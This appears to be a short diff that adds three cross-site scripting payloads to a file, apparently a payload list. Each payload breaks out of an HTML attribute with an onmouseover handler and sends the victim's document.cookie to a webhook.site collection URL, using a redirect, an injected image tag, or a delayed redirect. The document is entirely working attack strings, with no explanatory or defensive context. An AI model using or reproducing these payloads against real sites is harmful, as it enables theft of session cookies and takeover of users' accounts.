@@ -1,0 +1,3 @@
+exp' onmouseover='document.location=%22https://webhook.site/b22014b6-5537-43d2-ab7e-35ecfbf6a277?%22.concat(document.cookie)
+exp' onmouseover='document.write(%22<img src=https://webhook.site/b22014b6-5537-43d2-ab7e-35ecfbf6a277?%22.concat(document.cookie).concat(%22 />%22))
+exp' onmouseover='setTimeout(function()%7Bdocument.location=%22https://webhook.site/b22014b6-5537-43d2-ab7e-35ecfbf6a277?%22.concat(document.cookie);%7D,1)
